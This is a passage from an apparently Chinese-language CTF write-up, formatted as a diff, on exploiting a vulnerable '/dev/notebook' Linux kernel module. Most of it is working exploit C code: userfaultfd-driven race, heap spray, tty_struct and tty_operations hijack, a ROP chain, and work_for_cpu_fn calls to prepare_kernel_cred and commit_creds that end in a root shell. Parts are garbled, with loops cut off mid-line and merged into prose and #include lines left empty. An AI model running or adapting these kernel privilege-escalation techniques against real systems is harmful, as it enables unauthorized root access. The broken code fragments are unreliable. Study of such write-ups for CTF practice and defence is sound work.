@@ -1,0 +1,227 @@
+        rop[rop_idx++] = 0;
+        rop[rop_idx++] = (size_t) &getRootShell;
+        rop[rop_idx++] = user_cs;
+        rop[rop_idx++] = user_rflags;
+        rop[rop_idx++] = user_sp;
+        rop[rop_idx++] = user_ss;
+        write(note_fd, rop, fake_stack_idx);                    // copy the ropchain
+        write(note_fd, fake_tty_ops_data, fake_tty_ops_idx);    // hijack the tty_operations
+        write(note_fd, fake_tty_data, tty_idx);                 // hijack the tty_struct
+        puts("\033[32m\033[1m[+] TTY DATA hijack done.\033[0m");
+        // exploit
+        puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
+        for (int i = 0; i  经笔者多次测试，在开头的几步操作结束后都 sleep(1) 会 **极大地提高利用的稳定性** （主要是等待多个线程启动完成），不过由于资源限制所能喷的
+> tty_struct 就少了些（但也够用了）
+###  解法二：userfaultfd + heap spray + kernel UAF
+> 参考了[长亭的WP](https://zhuanlan.zhihu.com/p/385645268)
+前半部分与解法一基本上相同，但是在劫持 tty_struct 后并不是通过复杂的多次栈迁移进行利用，而是通过一个更为稳定的函数——
+**work_for_cpu_fn 稳定化利用**
+在开启了多核支持的内核中都有这个函数，定义于 `kernel/workqueue.c` 中：
+    struct work_for_cpu {
+        struct work_struct work;
+        long (*fn)(void *);
+        void *arg;
+        long ret;
+    };
+    static void work_for_cpu_fn(struct work_struct *work)
+    {
+        struct work_for_cpu *wfc = container_of(work, struct work_for_cpu, work);
+        wfc->ret = wfc->fn(wfc->arg);
+    }
+简单分析可知该函数可以理解为如下形式：
+    static void work_for_cpu_fn(size_t * args)
+    {
+        args[6] = ((size_t (*) (size_t)) (args[4](args[5]));
+    }
+即 `rdi + 0x20` 处作为函数指针执行，参数为 `rdi + 0x28` 处值，返回值存放在 `rdi + 0x30` 处，由此我们可以
+**很方便地分次执行 prepare_kernel_cred 和 commit_creds，完成稳定化提权**
+与之前不同的是在这里选择劫持 tty_operations 中的 ioctl 而不是 write，因为 tty_struct[4] 处成员
+`ldisc_sem` 为信号量，在执行到 work_for_cpu_fn 之前 **该值会被更改**
+需要注意的是 tty_operations 中的 ioctl 并不是直接执行的，此前需要经过多道检查，因此我们应当传入恰当的参数
+exp如下：
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include "kernelpwn.h"
+    #define PTM_UNIX98_OPS 0xffffffff81e8e440
+    #define PTY_UNIX98_OPS 0xffffffff81e8e320
+    #define COMMIT_CREDS 0xffffffff810a9b40
+    #define PREPARE_KERNEL_CRED 0xffffffff810a9ef0
+    #define WORK_FOR_CPU_FN 0xffffffff8109eb90
+    #define TTY_STRUCT_SIZE 0x2e0
+    static long page_size;
+    static sem_t sem_add, sem_edit;
+    static char * buf; // for userfaultfd
+    static char *page = NULL;
+    static void *
+    fault_handler_thread(void *arg)
+    {
+        struct uffd_msg msg;
+        int fault_cnt = 0;
+        long uffd;
+        struct uffdio_copy uffdio_copy;
+        ssize_t nread;
+        uffd = (long) arg;
+        for (;;) 
+        {
+            struct pollfd pollfd;
+            int nready;
+            pollfd.fd = uffd;
+            pollfd.events = POLLIN;
+            nready = poll(&pollfd, 1, -1);
+            if (nready == -1)
+                errExit("poll");
+            nread = read(uffd, &msg, sizeof(msg));
+            sleep(100);
+            if (nread == 0)
+                errExit("EOF on userfaultfd!\n");
+            if (nread == -1)
+                errExit("read");
+            if (msg.event != UFFD_EVENT_PAGEFAULT)
+                errExit("Unexpected event on userfaultfd\n");
+            uffdio_copy.src = (unsigned long) page;
+            uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
+                                                  ~(page_size - 1);
+            uffdio_copy.len = page_size;
+            uffdio_copy.mode = 0;
+            uffdio_copy.copy = 0;
+            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
+                errExit("ioctl-UFFDIO_COPY");
+            return NULL;
+        }
+    }
+    long note_fd;
+    typedef struct 
+    {
+        size_t idx;
+        size_t size;
+        char * buf;
+    } Note;
+    void noteAdd(size_t idx, size_t size, char * buf)
+    {
+        Note note = 
+        {
+            .idx = idx,
+            .size = size,
+            .buf = buf,
+        };
+        ioctl(note_fd, 0x100, &note);
+    }
+    void noteAddWrapper(void * args)
+    {
+        Note * note = (Note*) args;
+        noteAdd(note->idx, note->size, note->buf);
+    }
+    void noteDel(size_t idx)
+    {
+        Note note = 
+        {
+            .idx = idx,
+        };
+        ioctl(note_fd, 0x200, &note);
+    }
+    void noteEdit(size_t idx, size_t size, char * buf)
+    {
+        Note note = 
+        {
+            .idx = idx,
+            .size = size,
+            .buf = buf,
+        };
+        ioctl(note_fd, 0x300, &note);
+    }
+    void noteEditWrapper(void * args)
+    {
+        Note * note = (Note*) args;
+        noteEdit(note->idx, note->size, note->buf);
+    }
+    void noteGift(char * buf)
+    {
+        Note note = 
+        {
+            .buf = buf,
+        };
+        ioctl(note_fd, 100, &note);
+    }
+    void evilAdd(void * args)
+    {
+        sem_wait(&sem_add);
+        noteAdd((int)args, 0x50, buf);
+    }
+    void evilEdit(void * args)
+    {
+        sem_wait(&sem_edit);
+        noteEdit((int)args, 0x2000, buf);
+    }
+    struct
+    {
+        void * buf;
+        size_t size;
+    } notebook[0x10];
+    int main(int argc, char ** argv, char ** envp)
+    {
+        int tty_fd[0x100], tty_idx, fake_tty_ops_idx = -1, hit_tty = 0;
+        size_t tty_data[0x200], fake_tty_data[0x200], tty_ops, fake_tty_ops_data[0x200], rop[0x100];
+        pthread_t tmp_t, add_t, edit_t;
+        Note note;
+        saveStatus();
+        sem_init(&sem_add, 0, 0);
+        sem_init(&sem_edit, 0, 0);
+        note_fd = open("/dev/notebook", O_RDWR);
+        buf = (char*) mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+        page = malloc(0x1000);
+        strcpy(page, "arttnba3");
+        page_size = sysconf(_SC_PAGE_SIZE);
+        // register userfaultfd
+        registerUserFaultFd(buf, 0x1000, fault_handler_thread);
+        // initialize the notebook
+        for (int i = 0; i ioctl = WORK_FOR_CPU_FN + kernel_offset;
+        write(note_fd, fake_tty_ops_data, fake_tty_ops_idx);
+        /* ---- prepare_kernel_cred(NULL) ----*/
+        // store tty_struct data
+        read(note_fd, tty_data, tty_idx);
+        memcpy(fake_tty_data, tty_data, sizeof(size_t) * 0x200);
+        // set params in fake tty_struct
+        fake_tty_data[3] = notebook[fake_tty_ops_idx].buf;
+        fake_tty_data[4] = prepare_kernel_cred;
+        fake_tty_data[5] = NULL;
+        write(note_fd, fake_tty_data, tty_idx);
+        // exploit
+        puts("\033[34m\033[1m[*] Start prepare_kernel_cred(NULL)...\033[0m");
+        for (int i = 0; i < 0x80; i++)
+            ioctl(tty_fd[i], 233, 233);
+        puts("\033[32m\033[1m[*] Done.\033[0m");
+        /* ---- commit_creds(ROOT) ----*/getchar();
+        // get root cred back
+        read(note_fd, fake_tty_data, tty_idx);
+        // restore tty_struct data
+        memcpy(fake_tty_data, tty_data, sizeof(size_t) * 6);
+        // set params in fake tty_struct
+        fake_tty_data[3] = notebook[fake_tty_ops_idx].buf;
+        fake_tty_data[4] = commit_creds;
+        fake_tty_data[5] = fake_tty_data[6];
+        fake_tty_data[6] = tty_data[6];
+        write(note_fd, fake_tty_data, tty_idx);
+        // exploit
+        puts("\033[34m\033[1m[*] Start commit_creds(ROOT)...\033[0m");
+        for (int i = 0; i < 0x80; i++)
+            ioctl(tty_fd[i], 233, 233);
+        puts("\033[32m\033[1m[*] Done.\033[0m");
+        getRootShell();
+        return 0;
+    }
+运行即可提权到 root
